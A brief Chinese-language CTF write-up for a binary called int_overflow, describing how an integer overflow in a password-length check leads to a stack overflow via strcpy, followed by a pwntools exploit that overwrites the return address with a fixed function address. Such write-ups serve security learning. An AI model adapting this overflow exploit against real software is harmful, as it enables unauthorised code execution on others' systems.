程序防护：
![image](EE8825574E7A4DECBF5AE80E1262EE67)

程序流程：

1. login
    1. 输入用户名
    2. 输入密码 对密码检查时，使用strlen且存在init 型溢出漏洞，且使用strcpy复制字符串
2. exit
3. 

程序漏洞：

整型溢出漏洞绕过字符串长度检验，导致栈溢出漏洞。


exp:

```
from pwn import *
p = process('./int_overflow')
p.recv()
p.sendline("1")
p.recv()
p.sendline("d00m")
p.recv()
payload = flat(["a"*0x18 , 0x0804868B,"a"*0xe7])
p.sendline(payload)
p.interactive()
```